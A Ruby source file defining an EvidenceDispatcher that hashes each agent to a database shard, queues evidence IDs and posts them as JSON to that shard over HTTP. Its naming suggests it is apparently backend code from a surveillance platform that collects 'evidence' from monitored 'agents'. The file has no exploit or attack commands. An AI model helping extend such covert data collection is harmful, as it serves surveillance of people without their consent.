require 'rcs-common/trace'
require 'eventmachine'

require_relative 'shard'

module RCS
module DB

class EvidenceDispatcher
  include Singleton
  include RCS::Tracer
  include EventMachine::Protocols
  
  def initialize
    @shards = Array.new

    # for each known shard, prepare a list of notification
    Shard.all['shards'].each_with_index do |shard, index|
      ip, port = shard['host'].split(':')
      @shards[index] = {host: ip, queue: []}
    end
    # worker polling thread, check for health status
  end
  
  def notify(evidence_id, ident, instance)
    agent = ::Item.agents.where({ident: ident, instance: instance}).first
    # spread evidences to shards, each shard getting ALL the evidences for the same agent (round-robin)
    
    #identify the correct shard for the evidence
    hash_string = "#{ident}(#{instance})"
    shard_idx = hash_string.hash % @shards.length
    trace :debug, "Sending evidence #{ident} (#{instance}) to shard #{@shards[shard_idx][:host]}"
    
    # queue the evidence
    @shards[shard_idx][:queue].push({instance: instance, ident: ident, id: evidence_id})
    
    # send the queue to the correct shard
    http = EM::HttpRequest.new("http://#{@shards[shard_idx][:host]}:5150/").post :body => {ids: @shards[shard_idx][:queue]}.to_json
    http.callback do
      @shards[shard_idx][:queue].clear
      trace :info, "Notified evidence #{evidence_id} for agent #{agent[:name]} to worker #{@shards[shard_idx][:host]}."
    end
    http.errback do
      trace :error, "Cannot notify evidence #{evidence_id} for to shard #{@shards[shard_idx][:host]}. Will retry."
    end
    
    return true
  end
  
end # EvidenceDispatcher

end # ::DB
end # ::RCS
